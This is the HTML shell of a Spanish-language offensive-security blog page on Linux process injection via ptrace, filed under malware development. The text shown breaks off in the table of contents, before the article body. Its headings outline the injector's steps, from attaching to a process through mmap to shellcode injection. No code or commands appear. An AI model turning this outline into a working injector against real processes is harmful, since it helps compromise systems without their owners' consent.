
<!doctype html>
<html lang="es" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Offensive security research & notes">
      
      
      
        <link rel="canonical" href="https://0x574r.github.io/research/malware-dev/ptrace-injection/">
      
      
        <link rel="prev" href="../reverse-shell/">
      
      
      
        
      
      
      <link rel="icon" href="../../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>Process Injection via Ptrace - RAZOR</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      
  
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
  
  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M64%20480c-35.3%200-64-28.7-64-64V96c0-35.3%2028.7-64%2064-64h320c35.3%200%2064%2028.7%2064%2064v213.5c0%2017-6.7%2033.3-18.7%2045.3L322.7%20461.3c-12%2012-28.3%2018.7-45.3%2018.7zm325.5-176H296c-13.3%200-24%2010.7-24%2024v93.5z%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20384%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M292.9%20384c7.3-22.3%2021.9-42.5%2038.4-59.9C364%20289.7%20384%20243.2%20384%20192%20384%2086%20298%200%20192%200S0%2086%200%20192c0%2051.2%2020%2097.7%2052.7%20132.1%2016.5%2017.4%2031.2%2037.6%2038.4%2059.9h201.7zm-4.9%2048H96v16c0%2044.2%2035.8%2080%2080%2080h32c44.2%200%2080-35.8%2080-80zM184%20112c-39.8%200-72%2032.2-72%2072%200%2013.3-10.7%2024-24%2024s-24-10.7-24-24c0-66.3%2053.7-120%20120-120%2013.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%200c14.7%200%2028.2%208.1%2035.2%2021l216%20400c6.7%2012.4%206.4%2027.4-.8%2039.5S486.1%20480%20472%20480H40c-14.1%200-27.2-7.4-34.4-19.5s-7.5-27.1-.8-39.5l216-400c7-12.9%2020.5-21%2035.2-21m0%20352a32%2032%200%201%200%200%2064%2032%2032%200%201%200%200-64m0-192c-18.2%200-32.7%2015.5-31.4%2033.7l7.4%20104c.9%2012.5%2011.4%2022.3%2023.9%2022.3%2012.6%200%2023-9.7%2023.9-22.3l7.4-104c1.3-18.2-13.1-33.7-31.4-33.7z%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20144C384%2064.5%20312.4%200%20224%200S64%2064.5%2064%20144c0%2047.1%2025.1%2088.9%2064%20115.2V288c0%2017.7%2014.3%2032%2032%2032h128c17.7%200%2032-14.3%2032-32v-28.8c38.9-26.3%2064-68.1%2064-115.2m-224-16a32%2032%200%201%201%200%2064%2032%2032%200%201%201%200-64m96%2032a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m189.5%20179.7c-6.8-16.3-25.5-24-41.8-17.2L224%20397.3%2044.3%20322.5c-16.3-6.8-35%20.9-41.8%2017.2s.9%2035%2017.2%2041.8L140.8%20432%2019.7%20482.5c-16.3%206.8-24%2025.5-17.2%2041.8s25.5%2024%2041.8%2017.2L224%20466.7l179.7%2074.8c16.3%206.8%2035-.9%2041.8-17.2s-.9-35-17.2-41.8L307.2%20432l121.1-50.5c16.3-6.8%2024-25.5%2017.2-41.8%22/%3E%3C/svg%3E');--md-admonition-icon--info:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%20512a256%20256%200%201%200%200-512%20256%20256%200%201%200%200%20512m-32-352a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m-8%2064h48c13.3%200%2024%2010.7%2024%2024v88h8c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-80c-13.3%200-24-10.7-24-24s10.7-24%2024-24h24v-64h-24c-13.3%200-24-10.7-24-24s10.7-24%2024-24%22/%3E%3C/svg%3E');--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20512H96c-53%200-96-43-96-96V96C0%2043%2043%200%2096%200h304c26.5%200%2048%2021.5%2048%2048v288c0%2020.9-13.4%2038.7-32%2045.3V448c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032zM96%20384c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h256v-64zm32-232c0%2013.3%2010.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24H152c-13.3%200-24%2010.7-24%2024m24%2072c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24z%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M288%200H128c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032v151.5L7.5%20426.3C2.6%20435%200%20444.7%200%20454.7%200%20486.4%2025.6%20512%2057.3%20512h333.4c31.6%200%2057.3-25.6%2057.3-57.3%200-10-2.6-19.8-7.5-28.4L320%20215.5V64c17.7%200%2032-14.3%2032-32S337.7%200%20320%200zm-96%20215.5V64h64v151.5c0%2011.1%202.9%2022.1%208.4%2031.8L306%20320H142l41.6-72.7c5.5-9.7%208.4-20.6%208.4-31.8%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M0%20216C0%20149.7%2053.7%2096%20120%2096h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064H64c-35.3%200-64-28.7-64-64zm256%200c0-66.3%2053.7-120%20120-120h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064h-64c-35.3%200-64-28.7-64-64z%22/%3E%3C/svg%3E');}</style>



    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"IBM Plex Sans";--md-code-font:"JetBrains Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
<link rel="apple-touch-icon" sizes="180x180" href="https://0x574r.github.io/assets/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0x574r.github.io/assets/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://0x574r.github.io/assets/favicon-16x16.png">

  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#process-injection-via-ptrace" class="md-skip">
          Saltar a contenido
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Cabecera">
    <a href="../../.." title="RAZOR" class="md-header__button md-logo" aria-label="RAZOR" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            RAZOR
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Process Injection via Ptrace
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Cambiar a modo claro"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Cambiar a modo claro" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Buscar">
        
        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Inicializando búsqueda
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/0x574R" title="Ir al repositorio" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    0x574R
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="RAZOR" class="md-nav__button md-logo" aria-label="RAZOR" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    RAZOR
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/0x574R" title="Ir al repositorio" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    0x574R
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Malware Dev
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Malware Dev
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Malware Development
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../reverse-shell/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Reverse TCP Shell
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Process Injection via Ptrace
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Process Injection via Ptrace
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Tabla de contenidos
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introducción
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#la-syscall-ptrace" class="md-nav__link">
    <span class="md-ellipsis">
      
        La syscall PTRACE
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="La syscall PTRACE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#que-permite-hacer-ptrace" class="md-nav__link">
    <span class="md-ellipsis">
      
        ¿Qué permite hacer ptrace?
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argumentos-de-entrada" class="md-nav__link">
    <span class="md-ellipsis">
      
        Argumentos de Entrada
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#estructura-user_regs_struct" class="md-nav__link">
    <span class="md-ellipsis">
      
        Estructura user_regs_struct
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#explicacion-del-inyector-paso-a-paso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Explicación del inyector paso a paso
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Explicación del inyector paso a paso">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#seccion-de-datos" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sección de Datos
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attach-y-detencion-del-proceso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Attach y Detención del Proceso
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preservacion-del-contexto-de-ejecucion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Preservación del Contexto de Ejecución
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inyeccion-de-la-instruccion-syscall" class="md-nav__link">
    <span class="md-ellipsis">
      
        Inyección de la Instrucción Syscall
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configuracion-de-registros-para-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Configuración de Registros para MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ejecucion-controlada-de-la-syscall-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ejecución Controlada de la Syscall MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#restauracion-del-contenido-en-la-direccion-apuntada-por-rip" class="md-nav__link">
    <span class="md-ellipsis">
      
        Restauración del Contenido en la Dirección Apuntada por RIP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#restauracion-de-los-registros-originales" class="md-nav__link">
    <span class="md-ellipsis">
      
        Restauración de los Registros Originales
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#almacenamiento-del-rip-de-retorno" class="md-nav__link">
    <span class="md-ellipsis">
      
        Almacenamiento del RIP de Retorno
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inyeccion-del-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        Inyección del Shellcode
      
    </span>
  </a>
  
</li>
        
